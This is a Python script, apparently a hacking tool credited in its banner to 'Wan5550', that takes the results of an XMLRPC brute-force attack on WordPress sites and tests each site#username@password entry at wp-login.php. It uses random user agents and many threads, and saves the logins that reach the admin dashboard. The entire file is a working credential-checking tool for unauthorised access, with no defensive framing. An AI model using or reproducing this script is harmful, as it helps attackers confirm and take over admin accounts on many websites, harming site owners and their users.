import requests
import argparse
import random
import os
from concurrent.futures import ThreadPoolExecutor

gray = "\033[30;1m"
red = "\033[31;1m"
green = "\033[32;1m"
yellow = "\033[33;1m"
blue = "\033[34;1m"
pink = "\033[35;1m"
cyan = "\033[36;1m"
white = "\033[37;1m"

parser = argparse.ArgumentParser(description='[!] Mass Check Login XMLRPC Brute Force Result')
parser.add_argument('-r', '--result', metavar='', type=str, help='Result Your XMLRPC Brute Force List')
parser.add_argument('-s', '--save', metavar='', type=str, help='Save Name Result Check Login')
parser.add_argument('-t', '--thread', metavar='', type=int, help='Thread Tools')
args = parser.parse_args()

def uagent():
	ua = open('user-agents.txt','r').read().splitlines()
	return random.choice(ua)

def check_login(site):
	try:
		for x in " ":
			try:
				wp_login = site.split('#')[0]
				#wp-login.php
				wp_admin1 = wp_login.replace('/wp-login.php','')
				wp_admin = wp_admin1+'/wp-admin'
				#wp-admin
				username1 = site.split('#',1)[1]
				username = username1.split('@',1)[0]
				#username
				password = site.split('@',1)[1]
				#password
				try:
					try:
						try:
							req = requests.Session()
							headers1 = {
							'User-Agent':uagent(),
							'Cookie':'wordpress_test_cookie=WP Cookie check'
							}
							datar={
							'log':username, 'pwd':password, 'wp-submit':'Log In', 
							'redirect_to':wp_admin, 'testcookie':'1'
							}
							login = req.post(wp_login, headers=headers1, data=datar)
							reqs = req.get(wp_admin).text
							if 'wp-toolbar' in reqs:
								print(f'{green}[+] {site} > Succes Login')
								try:
									os.mkdir('Succes Login')
									path = os.path.join('Succes Login',args.save)
									open(path,'a').write(site+'\n')
								except:
									path = os.path.join('Succes Login',args.save)
									open(path,'a').write(site+'\n')
							else:
								print(f'{red}[-] {site} > Fail Login')
								try:
									os.mkdir('Failed Login')
									path = os.path.join('Failed Login','Failed Login.txt')
									open(path,'a').write(site+'\n')
								except:
									path = os.path.join('Failed Login','Failed Login.txt')
									open(path,'a').write(site+'\n')
						except requests.exceptions.Timeout:
							print(f'{yellow}[!] {site} > Timeout Error')
					except requests.exceptions.RequestException:
						print(f'{yellow}[!] {site} > Error Something Else')
				except requests.exceptions.ConnectionError:
					print(f'{yellow}[!] {site} > Connection Error')
			except requests.exceptions.HTTPError:
				print(f'{yellow}[!] {site} > HTTP Error')
	except:
		print(f' {yellow}[!] Error List File {args.result} -> http://site.com#username@password{white}\n')
  	
if __name__ == '__main__':
	
	banner = f'''{white}
	
  _      _____  __             _      _______           __  
 | | /| / / _ \/ /  ___  ___ _(_)__  / ___/ /  ___ ____/ /__
 | |/ |/ / ___/ /__/ _ \/ _ `/ / _ \/ /__/ _ \/ -_) __/  '_/
 |__/|__/_/  /____/\___/\_, /_/_//_/\___/_//_/\__/\__/_/\_\ 
                       /___/                                
                                                             
               XMLRPC Result Check Login
               - > site.com#username@password
               
               By : Wan5550
               Github : github.com/wannazid
	'''
	print(banner)
	
	try:
		open_site = open(args.result,'r').read().splitlines()
		dc = set(open_site)
		lis = list(dc)
		with ThreadPoolExecutor(max_workers=int(args.thread)) as t:
			[t.submit(check_login, situs) for situs in lis]
	except Exception as e:
		print(f' {yellow}Error : {e}{white}\n\n [!] Usage : python3 check.py -r result.txt -s savefile.txt -t thread\n [!] Help : python3 check.py -h\n')